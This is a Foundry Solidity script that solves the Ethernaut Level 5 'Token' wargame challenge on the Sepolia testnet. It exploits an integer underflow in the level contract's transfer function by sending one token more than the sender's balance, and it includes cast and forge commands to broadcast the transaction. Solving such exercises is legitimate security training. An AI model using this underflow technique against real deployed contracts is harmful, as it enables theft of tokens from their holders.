// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/levels/Token.sol";

/*
    Solution script for the Ethernaut Level 5: Token

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in TokenScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Token.s.sol:TokenScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Token.s.sol/11155111
*/

contract TokenScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xF2b9Aa79C17615571b12F45777a81926013a99b5;
    Token public level5 = Token(instance);
    address other = makeAddr("other");

    function run() external {
        vm.startBroadcast();

        // send 1 more token (21) than our balance to any other address to trigger overflow
        level5.transfer(address(other), 21);

        require(level5.balanceOf(msg.sender) > 20, "balance not increased");

        vm.stopBroadcast();
    }
}